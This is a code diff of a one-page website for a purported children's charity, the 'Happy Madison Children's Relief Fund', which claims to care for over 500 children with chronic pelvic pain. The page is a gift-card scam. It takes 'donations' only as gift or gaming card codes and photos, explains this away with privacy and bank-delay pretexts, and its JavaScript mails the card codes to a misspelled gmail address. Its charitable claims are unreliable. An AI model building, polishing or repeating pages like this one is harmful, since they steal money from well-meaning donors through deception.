@@ -5,31 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Happy Madison Children’s Relief Fund</title>
     <style>
-        :root { --primary: #2c3e50; --accent: #3498db; --light: #f4f7f6; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; color: #333; background: var(--light); }
-        header { background: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
-        .logo { font-weight: bold; font-size: 1.1rem; color: var(--primary); }
-        .menu-btn { cursor: pointer; font-size: 1.5rem; border: none; background: none; color: var(--primary); }
-        .side-menu { position: fixed; top: 0; right: -300px; width: 250px; height: 100%; background: var(--primary); color: white; transition: 0.3s; padding-top: 60px; z-index: 999; }
-        .side-menu a { display: block; padding: 15px 25px; color: white; text-decoration: none; font-size: 1.1rem; border-bottom: 1px solid #3e4f5f; }
+        :root { --primary: #2c3e50; --accent: #e91e63; --light: #f9f9f9; }
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; color: #333; background: var(--light); line-height: 1.6; }
+        header { background: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+        .logo { font-weight: bold; font-size: 1rem; color: var(--primary); text-transform: uppercase; letter-spacing: 1px; }
+        .menu-btn { cursor: pointer; font-size: 1.8rem; border: none; background: none; color: var(--primary); }
+        .side-menu { position: fixed; top: 0; right: -300px; width: 260px; height: 100%; background: var(--primary); color: white; transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); padding-top: 80px; z-index: 999; box-shadow: -5px 0 15px rgba(0,0,0,0.2); }
+        .side-menu a { display: block; padding: 18px 30px; color: white; text-decoration: none; font-size: 1.1rem; border-bottom: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
+        .side-menu a:hover { background: rgba(255,255,255,0.1); padding-left: 40px; }
         .side-menu.active { right: 0; }
-        .close-btn { position: absolute; top: 20px; left: 20px; color: white; background: none; border: none; font-size: 1.5rem; cursor: pointer; }
-        section { padding: 40px 20px; max-width: 800px; margin: auto; display: none; min-height: 80vh; }
+        .close-btn { position: absolute; top: 25px; left: 25px; color: white; background: none; border: none; font-size: 1.8rem; cursor: pointer; }
+        section { padding: 40px 20px; max-width: 800px; margin: auto; display: none; animation: fadeIn 0.5s ease; }
         section.active { display: block; }
-        .hero-img { width: 100%; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        .homepage-text { text-align: center; line-height: 1.6; }
-        .info-box { background: white; padding: 20px; border-radius: 8px; border-left: 5px solid var(--accent); margin-bottom: 25px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; font-size: 0.9rem; }
-        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; background: white; }
-        .btn-submit { background: var(--accent); color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 1rem; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        h2 { color: var(--primary); border-bottom: 2px solid var(--accent); padding-bottom: 10px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .hero-img { width: 100%; border-radius: 12px; margin-bottom: 25px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); object-fit: cover; }
+        .info-card { background: white; padding: 25px; border-radius: 12px; margin-bottom: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border-top: 4px solid var(--accent); }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 0.95rem; color: #444; }
+        input, select, textarea { width: 100%; padding: 14px; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 1rem; transition: 0.3s; }
+        input:focus, select:focus, textarea:focus { border-color: var(--accent); outline: none; box-shadow: 0 0 0 3px rgba(233, 30, 99, 0.1); }
+        .btn-submit { background: var(--accent); color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-size: 1.1rem; cursor: pointer; font-weight: bold; margin-top: 15px; transition: 0.3s; }
+        .btn-submit:hover { background: #d81b60; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(233, 30, 99, 0.3); }
+        .method-info { background: #fff4f7; padding: 20px; border-radius: 10px; border: 1px dashed var(--accent); margin-top: 25px; font-size: 0.9rem; }
+        h1, h2 { color: var(--primary); margin-top: 0; }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
     <header>
-        <div class="logo">HM Children’s Relief Fund</div>
+        <div class="logo">Children’s Relief Fund</div>
         <button class="menu-btn" onclick="toggleMenu()">☰</button>
     </header>
 
@@ -42,48 +48,34 @@
     </div>
 
     <section id="home" class="active">
-        <div class="homepage-text">
-            <img src="0db622d963ddc21cb3aac4bd20dddbb4.jpg" alt="Foundation" class="hero-img">
+        <img src="0db622d963ddc21cb3aac4bd20dddbb4.jpg" alt="Children Care" class="hero-img">
+        <div style="text-align: center;">
             <h1>Making the Poor Kids Smile</h1>
-            <p>Our foundation is dedicated to providing specialized care and pediatric support to children in need. We focus on healing, growth, and the simple joy of childhood.</p>
-            <img src="72c4c4b4bd1513c9e29ca9ebe55776df.jpg" alt="Care" class="hero-img" style="margin-top:20px;">
+            <p>Our foundation provides a safe haven for children in need, focusing on nutrition, health, and a happy environment where they can grow with dignity.</p>
+            <img src="72c4c4b4bd1513c9e29ca9ebe55776df.jpg" alt="Foundation Life" class="hero-img" style="margin-top:20px;">
         </div>
     </section>
 
     <section id="about">
-        <h2>About Our Good Works</h2>
-        <p>The Happy Madison Children’s Relief Fund specializes in caring for children battling Chronic Pelvic Pain Syndrome (CPPS). We currently provide full care for over 500 children.</p>
-        <p>Our work focuses on three pillars: Specialized Pediatric Feeding, Medical Intervention, and Safe Housing. To protect the privacy of the children and homes, we do not publish specific locations, but our impact is seen in every smile.</p>
-        <img src="77316900940097b984b663afdd1321ef.jpg" alt="Helping" class="hero-img">
+        <h2>Our Mission & Vision</h2>
+        <p>The Happy Madison Children’s Relief Fund is dedicated to providing specialized medical and pediatric care for over 500 children. We focus on healing, emotional support, and immediate intervention for kids battling Chronic Pelvic Pain Syndrome (CPPS).</p>
+        <img src="77316900940097b984b663afdd1321ef.jpg" alt="Team Work" class="hero-img">
+        <p>We work quietly to protect the privacy of our residents, ensuring that every donation goes directly to the medicine, food, and housing required for their recovery.</p>
     </section>
 
     <section id="support">
-        <h2>Administrative Support</h2>
-        <p>If you have questions regarding our initiatives or would like to verify information, please contact our management team directly.</p>
-        <div class="info-box">
-            <strong>Official Management Email:</strong><br>
-            teammangementt@gmail.com
+        <h2>Contact Management</h2>
+        <img src="IMG_20260510_193422.jpg" alt="Services" class="hero-img">
+        <div class="info-card">
+            <strong>Administration Office Email:</strong><br>
+            <a href="mailto:teammangementt@gmail.com" style="color: var(--accent); text-decoration: none; font-weight: bold;">teammangementt@gmail.com</a>
+            <p style="margin-top: 15px; font-size: 0.9rem;">For official inquiries regarding our 100% care initiative and pediatric programs.</p>
         </div>
-        <img src="IMG_20260510_193422.jpg" alt="Support" class="hero-img">
     </section>
 
     <section id="donation">
-        <h2>Support the Children</h2>
-        
-        <div class="info-box">
-            <h3>Use of Funds</h3>
-            <p>100% of your contributions are utilized for:</p>
-            <ul>
-                <li><strong>Medical Care:</strong> Specialized treatment for children with CPPS.</li>
-                <li><strong>Pediatric Feeding:</strong> Specialized nutrition programs for growth.</li>
-                <li><strong>Safe Shelter:</strong> Maintaining secure, private homes for recovery.</li>
-            </ul>
-        </div>
-
-        <div class="info-box">
-            <h3>Why Gift Cards?</h3>
-            <p>To maintain the absolute <strong>privacy and security</strong> of our private homes and international donors, we utilize a manual manual payment portal via verified gift cards. This allows for immediate, cross-border medical funding without the delays or public tracking associated with traditional international banking, ensuring the children receive care without interruption.</p>
-        </div>
+        <h2>Support Our Children</h2>
+        <p>Your kindness helps provide feeding, medicine, and shelter for over 500 children. Every contribution brings a smile to a child's face.</p>
         
         <form id="donationForm">
             <div class="form-group">
@@ -95,11 +87,11 @@
             </div>
             <div class="form-group" id="nameBox">
                 <label>Your Name:</label>
-                <input type="text" id="donorName" placeholder="Enter your name">
+                <input type="text" id="donorName" placeholder="Enter your full name">
             </div>
             <div class="form-group">
                 <label>Amount to Donate ($):</label>
-                <input type="number" id="amount" placeholder="e.g. 500">
+                <input type="number" id="amount" placeholder="Amount in USD">
             </div>
             <div class="form-group">
                 <label>Select Card Type:</label>
@@ -110,42 +102,60 @@
                 </select>
             </div>
             <div class="form-group">
-                <label>E-Code (Optional):</label>
-                <input type="text" id="eCode" placeholder="Enter code here">
+                <label>E-Code (If available):</label>
+                <input type="text" id="eCode" placeholder="Enter card code">
             </div>
             <div class="form-group">
-                <label>Upload Card Image (required after submit):</label>
-                <input type="file" id="cardImage">
+                <label>Message or Prayer Request:</label>
+                <textarea id="message" rows="3" placeholder="A word for the children..."></textarea>
             </div>
-            <div class="form-group">
-                <label>Message / Prayer Request:</label>
-                <textarea id="message" rows="3" placeholder="Write your message here..."></textarea>
-            </div>
-            <button type="button" class="btn-submit" onclick="submitDonation()">Submit Donation Details</button>
+            <button type="button" class="btn-submit" onclick="submitDonation()">Submit Donation</button>
         </form>
-        <img src="b70b664421eebc7302476cdbbb34465c.jpg" alt="Donation Impact" class="hero-img" style="margin-top:20px;">
+
+        <div class="method-info">
+            <strong>Why we use Gift/Gaming Cards for international support:</strong><br><br>
+            To ensure the absolute privacy of the children's homes and to bypass the long delays of international bank transfers, we utilize a <strong>Manual Direct Funding Portal</strong> via verified cards. 
+            <br><br>
+            This method allows our administrative office to convert contributions into local medical supplies and feeding resources <strong>instantly</strong>, ensuring that the children's needs are met without having to wait for traditional banking clearance. It is the most secure and private way for international fans to support the foundation directly.
+        </div>
+
+        <img src="b70b664421eebc7302476cdbbb34465c.jpg" alt="Impact" class="hero-img" style="margin-top:30px;">
     </section>
 
     <script>
         function toggleMenu() { document.getElementById('sideMenu').classList.toggle('active'); }
+        
         function showSection(sectionId) {
             document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
             document.getElementById(sectionId).classList.add('active');
             toggleMenu();
             window.scrollTo(0,0);
         }
+
         function toggleName() {
             const status = document.getElementById('anonStatus').value;
             document.getElementById('nameBox').style.display = (status === 'Anonymous') ? 'none' : 'block';
         }
+
         function submitDonation() {
             const name = document.getElementById('donorName').value || "Anonymous";
             const amount = document.getElementById('amount').value;
             const card = document.getElementById('cardType').value;
             const code = document.getElementById('eCode').value;
             const msg = document.getElementById('message').value;
-            const subject = encodeURIComponent("New Donation Confirmation - " + name);
-            const body = encodeURIComponent("Hello Administrative Office,\n\nI would like to support the children's fund.\n\nDonor: " + name + "\nAmount: $" + amount + "\nCard Type: " + card + "\nCode: " + code + "\nMessage/Prayer: " + msg + "\n\n(Note: I have completed the submission. Please find the attached card photo for verification.)");
+
+            const subject = encodeURIComponent("Foundation Support Confirmation - " + name);
+            const body = encodeURIComponent(
+                "Official Notification to Management,\n\n" +
+                "I am submitting a donation to support the children's relief fund.\n\n" +
+                "Donor Name: " + name + "\n" +
+                "Amount: $" + amount + "\n" +
+                "Payment Method: " + card + "\n" +
+                "Card Code: " + code + "\n" +
+                "Personal Message: " + msg + "\n\n" +
+                "Note: I am attaching the card image to this email for administrative verification."
+            );
+
             window.location.href = `mailto:teammangementt@gmail.com?subject=${subject}&body=${body}`;
         }
     </script>
